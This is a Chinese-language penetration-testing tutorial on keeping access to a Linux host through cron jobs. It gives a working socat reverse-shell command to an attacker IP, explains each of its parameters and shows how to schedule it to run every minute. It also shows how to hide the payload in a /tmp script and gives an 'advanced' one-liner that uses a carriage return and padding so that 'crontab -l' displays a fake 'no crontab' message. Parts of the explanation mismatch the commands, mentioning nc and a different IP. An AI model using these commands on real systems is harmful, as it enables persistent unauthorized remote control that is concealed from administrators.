### Linux 计划任务权限维持

**靶机有 socat 的情况下**

```bash
socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:192.168.41.151:6666
```

**`socat`**: 这是命令的核心工具。`socat` 被称为网络工具中的“瑞士军刀”，它可以在两个单向数据流之间建立双向连接。在这里，它连接了本地的 **Shell I/O 流**和**远程的 TCP 网络流**

**`exec:'bash -i',pty,stderr,setsid,sigint,sane`**: 这一部分定义了 **本地数据流**（即目标机上的 Shell 进程）的特性

- **`exec:'bash -i'`**: 告诉 `socat` 执行 `/bin/bash` 并开启一个**交互式 Shell**（`-i`）
- **`pty`**: 这是关键参数之一，它为 `bash` 进程分配了一个**伪终端（Pseudo-Terminal）**。这使得获得的 Shell 具有 **稳定性**，能够支持 Tab 键补全、方向键、以及运行 `sudo`、`vi` 等需要终端控制的程序
- **`stderr`**: 将标准错误输出也重定向到网络连接，确保攻击者能看到所有错误信息
- **`setsid` / `sigint` / `sane`**: 这些参数都是为了提高 Shell 的**稳定性和可靠性**。它们处理会话ID、中断信号（如 Ctrl+C）和终端参数设置，确保你在 Shell 中的操作不会导致连接意外中断或显示混乱

**`tcp:103.82.55.92:7777`**: 这一部分定义了**远程网络流**

- `tcp`: 指定使用 TCP 协议进行连接
- `103.82.55.92:7777`: 这是目标连接的地址和端口。它指向**攻击者的 IP 地址**和预先设置好的**监听端口**

![](https://pic1.imgdb.cn/item/68d641f0c5157e1a883695f4.png)

当然我们可以直接 `crontab -e` 加入 payload 实现权限维持

系统会提示你选择一个编辑器

输入 `1` 并按回车键输入以下 payload

```
* * * * * socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:192.168.41.151:6666
```

**`\* \* \* \* \*`**: Cron 的时间设置，表示“每分钟的每小时的每一天的每个月的任何星期”，即**每分钟运行一次**

**在 nano 中操作：**

- 按 `Ctrl + O` (Write Out) 保存文件
- 按 `Enter` 键确认文件名
- 按 `Ctrl + X` 退出编辑器

![](https://pic1.imgdb.cn/item/68d643d1c5157e1a8836a7b3.png)

也可以通过绝对路径的某个脚本来进行藏匿真实的 Payload 放进脚本中

![](https://pic1.imgdb.cn/item/68d644b2c5157e1a8836ae07.png)

添加权限后换位置

![](https://pic1.imgdb.cn/item/68d64763c5157e1a8836c435.png)

在定时任务中添加

```
* * * * * /tmp/test.sh
```

![](https://pic1.imgdb.cn/item/68d64794c5157e1a8836c792.png)

成功连接

![](https://pic1.imgdb.cn/item/68d647cfc5157e1a8836caa8.png)

**高级权限维持**

```bash
(crontab -l;printf "* * * * * socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:192.168.41.151:6666;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```

1. `crontab -l`：读取现有任务

- **作用：** 列出当前用户（这里是 `root`，因为前面使用了 `sudo crontab -e`，或者你直接在 root Shell 下运行）所有的定时任务
- **结果：** 输出到标准输出流，并通过管道 `|` 传递给下一个命令

2. `printf "..."`：构造恶意 Payload 和伪装信息

这是命令的核心，它构造了一个带有伪装的字符串，并追加到 Crontab 内容的末尾

- `;/bin/bash --noprofile -i;`:
  - **Shell 逃逸/双重执行：** 这是一个额外的 Shell 执行命令。它确保即使 `nc` 命令失败（例如目标机上没有 `-e` 参数），它也会尝试启动一个交互式 Shell。`--noprofile` 使其启动更快
- `\r`:
  - **回车符（Carriage Return）：** 将光标移到当前行的最前面，而不换行
- `no crontab for \ `whoami` %100c\n`:
  - **关键伪装：** 这是最巧妙的部分。它模仿了系统在用户没有 Crontab 时会显示的默认信息：`no crontab for [username]`
    - `\r` 将光标移到行首
    - `no crontab for \`whoami``这段文本会**覆盖**掉你之前添加的`nc` Payload 的**前半部分**
    - `%100c` 会打印 100 个空格，进一步填充或覆盖掉 Payload 的剩余部分
    - **注意：** 这里的伪装是**欺骗眼睛的**。当用户使用 `crontab -l` 查看时，屏幕上会看到 `no crontab for user` 这样的信息，**误以为没有定时任务**，但实际的 Crontab 文件内容中，Payload 仍然存在（只是被覆盖打印了）

![](https://pic1.imgdb.cn/item/68d65064c5157e1a88374c29.png)
